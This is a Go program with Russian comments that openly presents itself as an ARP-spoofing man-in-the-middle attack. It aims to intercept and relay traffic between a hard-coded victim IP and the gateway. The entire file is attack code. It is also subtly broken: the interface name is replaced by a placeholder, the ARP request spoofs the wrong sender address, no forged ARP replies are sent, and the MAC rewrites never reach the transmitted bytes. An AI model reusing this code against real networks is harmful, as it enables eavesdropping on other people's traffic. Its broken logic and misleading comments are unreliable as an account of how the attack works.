package main

import (
	"fmt"
	"log"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	ifaceName  string           = "eth0"          // Имя сетевого интерфейса
	targetIP   string           = "192.168.0.100" // IP-адрес цели
	gatewayIP  string           = "192.168.0.1"   // IP-адрес шлюза
	targetMac  net.HardwareAddr                   // MAC-адрес цели
	gatewayMac net.HardwareAddr                   // MAC-адрес шлюза
)

func main() {
	fmt.Println("Starting MITM Attack")

	// Вывод доступных сетевых интерфейсов
	interfaces, err := net.Interfaces()
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("Available interfaces:")
	for _, iface := range interfaces {
		fmt.Println(iface.Name)
	}

	// Обновление имени сетевого интерфейса
	ifaceName = "имя_интерфейса" // Замените "имя_интерфейса" на выбранное вами имя

	// Получаем MAC-адрес цели и шлюза
	targetMac = getMACAddress(targetIP)
	gatewayMac = getMACAddress(gatewayIP)

	go arpSpoof(targetIP, targetMac, gatewayIP, gatewayMac) // Атака на цель
	go arpSpoof(gatewayIP, gatewayMac, targetIP, targetMac) // Атака на шлюз

	// Бесконечный цикл для сохранения программы активной
	for {
		time.Sleep(10 * time.Second)
	}

}

// Функция для получения MAC-адреса по IP-адресу
func getMACAddress(ip string) net.HardwareAddr {
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		log.Fatal(err)
	}

	ipAddr := net.ParseIP(ip)
	if ipAddr == nil {
		log.Fatalf("Invalid IP address: %s", ip)
	}

	// Отправляем ARP-запрос для получения MAC-адреса
	conn, err := pcap.OpenLive(iface.Name, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	// Создаем и отправляем ARP-пакет
	ethernetLayer := layers.Ethernet{
		SrcMAC:       iface.HardwareAddr,
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		EthernetType: layers.EthernetTypeARP,
	}

	arpLayer := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPRequest,
		SourceHwAddress:   iface.HardwareAddr,
		SourceProtAddress: ipAddr,
		DstHwAddress:      net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		DstProtAddress:    ipAddr,
	}

	buffer := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}
	err = gopacket.SerializeLayers(buffer, opts, &ethernetLayer, &arpLayer)
	if err != nil {
		log.Fatal(err)
	}

	outgoingPacket := buffer.Bytes()

	err = conn.WritePacketData(outgoingPacket)
	if err != nil {
		log.Fatal(err)
	}

	// Получаем ответный ARP-пакет
	packetSource := gopacket.NewPacketSource(conn, conn.LinkType())
	for packet := range packetSource.Packets() {
		arpLayer := packet.Layer(layers.LayerTypeARP)
		if arpLayer != nil {
			arpPacket := arpLayer.(*layers.ARP)
			if arpPacket.Operation == layers.ARPReply &&
				net.IP(arpPacket.SourceProtAddress).Equal(ipAddr.To4()) {
				return arpPacket.SourceHwAddress
			}
		}
	}

	return nil
}

// Функция для выполнения MITM-атаки с использованием ARP
func arpSpoof(targetIP string, targetMac net.HardwareAddr, gatewayIP string, gatewayMac net.HardwareAddr) {
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		log.Fatal(err)
	}

	// Отслеживаем пакеты на сетевом интерфейсе
	handle, err := pcap.OpenLive(iface.Name, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

	for packet := range packetSource.Packets() {
		// Проверяем, является ли пакет IPv4
		ipLayer := packet.Layer(layers.LayerTypeIPv4)
		if ipLayer == nil {
			continue
		}

		ipPacket := ipLayer.(*layers.IPv4)

		// Перехватываем только пакеты, адресованные цели или шлюзу
		if ipPacket.DstIP.Equal(net.ParseIP(targetIP)) {
			// Заменяем MAC-адрес и отправляем пакет шлюзу
			ethLayer := packet.Layer(layers.LayerTypeEthernet)
			if ethLayer == nil {
				continue
			}

			ethPacket := ethLayer.(*layers.Ethernet)
			ethPacket.DstMAC = gatewayMac
			ethPacket.SrcMAC = iface.HardwareAddr

			err = handle.WritePacketData(packet.Data())
			if err != nil {
				log.Println(err)
			}
		} else if ipPacket.DstIP.Equal(net.ParseIP(gatewayIP)) {
			// Заменяем MAC-адрес и отправляем пакет цели
			ethLayer := packet.Layer(layers.LayerTypeEthernet)
			if ethLayer == nil {
				continue
			}

			ethPacket := ethLayer.(*layers.Ethernet)
			ethPacket.DstMAC = targetMac
			ethPacket.SrcMAC = iface.HardwareAddr

			err = handle.WritePacketData(packet.Data())
			if err != nil {
				log.Println(err)
			}
		}
	}
}
